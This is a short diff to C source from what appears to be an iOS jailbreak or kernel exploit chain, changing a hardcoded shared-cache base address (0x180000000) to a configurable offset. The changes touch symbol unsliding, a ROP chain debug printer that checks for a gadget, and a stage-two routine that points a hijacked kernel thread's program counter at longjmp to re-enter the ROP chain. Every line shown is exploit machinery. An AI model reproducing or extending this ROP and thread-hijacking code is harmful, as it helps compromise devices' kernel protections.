@@ -300,7 +300,7 @@ uint64_t get_addr_from_name(offset_struct_t* offsets, char* name)
     syscall(294, &cache_addr); // get the current slid cache address
 #pragma clang diagnostic pop
     // unslide the ptr returned by dlsym
-    sym += 0x180000000;
+    sym += offsets->old_cache_addr;
     sym -= cache_addr;
     return sym;
 }
@@ -351,7 +351,7 @@ void build_chain_DBG(offset_struct_t* offsets, rop_var_t* ropvars)
             buf = next->value;
             // we add and then we subtract otherwise it could underflow
             buf += offsets->new_cache_addr;
-            buf -= 0x180000000;
+            buf -= offsets->old_cache_addr;
             printf("0x%.8llx: ", current_addr);
             printf("0x%.8llx (code address org:%llx) ", buf, next->value);
             if (next->value == offsets->BEAST_GADGET) {
@@ -1002,7 +1002,7 @@ void stage2(jake_img_t kernel_symbols, offset_struct_t* offsets, offsets_t* lib_
     DEFINE_ROP_VAR("racer_kernel_thread", sizeof(thread_act_t), tmp);
     _STRUCT_ARM_THREAD_STATE64* new_thread_state = malloc(sizeof(_STRUCT_ARM_THREAD_STATE64));
     memset(new_thread_state, 0, sizeof(_STRUCT_ARM_THREAD_STATE64));
-    new_thread_state->__pc = offsets->longjmp - 0x180000000 + offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
+    new_thread_state->__pc = offsets->longjmp - offsets->old_cache_addr + offsets->new_cache_addr; /*slide it here*/ // we will point pc to longjump so that we can get into rop again easily
     new_thread_state->__x[0] = offsets->stage2_base + offsets->stage2_max_size + offsets->stage2_barrier_buffer_size /*x0 should point to the longjmp buf*/; // this means we can easily just use a longjump buf at the front of the thread to control all regs
     DEFINE_ROP_VAR("thread_state", sizeof(_STRUCT_ARM_THREAD_STATE64), new_thread_state)
     ROP_VAR_ARG_HOW_MANY(3);
